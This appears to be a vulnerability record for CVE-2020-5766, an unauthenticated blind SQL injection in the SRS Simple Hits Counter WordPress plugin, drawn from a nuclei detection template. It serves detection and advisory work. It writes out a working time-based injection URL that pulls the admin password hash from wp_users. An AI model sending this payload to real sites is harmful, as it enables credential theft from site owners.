---
cve_id: CVE-2020-5766
template_path: nuclei-templates/http/cves/2020/CVE-2020-5766.yaml
affected_product: SRS Simple Hits Counter
severity: high
authentication: none
external_callback: false
affected_versions: 1.0.3 and 1.0.4
preconditions: []
poc_classification: info-leak
---

## Vulnerability
The SRS Simple Hits Counter WordPress plugin versions 1.0.3 and 1.0.4 is affected by an unauthenticated blind SQL injection (CWE-89) due to improper neutralization of special elements used in SQL commands in the `srs_update_counter` AJAX action of `admin-ajax.php`. A remote unauthenticated attacker can determine the value of database fields (e.g. extracting `user_pass` hashes from the `wp_users` table for the 'admin' user via time-based inference).

**Impact**: Unauthenticated attackers can extract database contents via blind SQL injection, potentially exposing sensitive WordPress user data and credentials.  
**CVSS**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**Remediation**: Update to the latest version of the SRS Simple Hits Counter plugin.

## PoC / Detection
Classification: info-leak

The template performs a two-step detection flow.  
1. Issues a GET request to `/` and internally matches for the presence of the string `/wp-content/plugins/srs-simple-hits-counter` in the response body (status 200).  
2. Issues a GET request to `/wp-admin/admin-ajax.php?action=srs_update_counter&post_id=1+and+1=0)+union+select+(select+if(ascii(substring((select+user_pass+from+wp_users+where+user_login=char(97,100,109,105,110)),%d,1))=%d,sleep(6),sleep(0))),1,1,1,1,1;--` (20 s timeout) and matches on response duration >= 6 seconds to confirm the time-based blind SQL injection.

## References
- https://github.com/tenable/poc/blob/master/WordPress/plugins/SRS_Simple_Hits_Counter/blind_sqli_tra_2020_42.py
- https://www.tenable.com/security/research/tra-2020-42
